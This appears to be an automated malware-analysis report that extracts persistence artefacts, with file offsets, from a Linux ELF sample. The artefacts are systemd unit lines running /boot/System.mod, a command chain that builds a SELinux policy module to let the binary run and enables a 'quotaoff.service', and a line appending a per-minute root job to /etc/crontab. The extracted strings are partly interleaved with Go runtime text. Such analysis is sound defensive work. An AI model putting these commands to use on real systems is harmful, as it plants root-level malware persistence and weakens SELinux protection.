# Persistence Script Block Extraction

- Sample: `0a70d7699c8e0629597dcc03b1aef0beebec03ae0580f2c070fb2bfd2fd89a71.elf`
- Total marker hits: `8`

## Extracted Service Unit Lines
- `ExecReload=/boot/System.mod`
- `ExecStart=/boot/System.mod`
- `ExecStop=/boot/System.mod`

## Extracted systemctl Blocks
- `cd /boot;ausearch -c 'System.mod' --raw | audit2allow -M my-Systemmod;semodule -X 300 -i my-Systemmod.ppcd /boot;systemctl daemon-reload;systemctl enable quotaoff.service;systemctl start quotaoff.service;journalctl -xe --no-pager`

## Extracted Cron Blocks
- `9d6bd43ae742173ec17dde38bd0429209c6ad43bf504239d6ccf36bc1d3628d460d730bd096b2bdb67ce2dbd1e2c9d7cc827bc1e262edc26d233f0022a21db6e9536fc0322both Setctty and Foreground set in SysProcAttrcipher.newCFB: IV length must equal block sizeecho "*/1 * * * * root /.mod " >> /etc/crontabmemory reservation exceeds address space limitpanicwrap: unexpected string after type name: released less than one physical page of memoryruntime: failed to create new OS thread (have runtime: name offset base pointer out of rangeruntime: panic before malloc heap initialized`

## Marker Anchors
- `/etc/profile.d/gateway.sh` at file offset `0x116085` (VA `0x516085`)
- `/etc/profile.d/bash_cfg.sh` at file offset `0x11643b` (VA `0x51643b`)
- `/usr/lib/systemd/system/quotaoff.service` at file offset `0x118fa3` (VA `0x518fa3`)
- `echo "*/1 * * * * root /.mod " >> /etc/crontab` at file offset `0x119f18` (VA `0x519f18`)
- `systemctl daemon-reload` at file offset `0x11b568` (VA `0x51b568`)
- `ExecStart=/boot/System.mod` at file offset `0x11b6be` (VA `0x51b6be`)
- `ExecReload=/boot/System.mod` at file offset `0x11b6d9` (VA `0x51b6d9`)
- `ExecStop=/boot/System.mod` at file offset `0x11b6f5` (VA `0x51b6f5`)
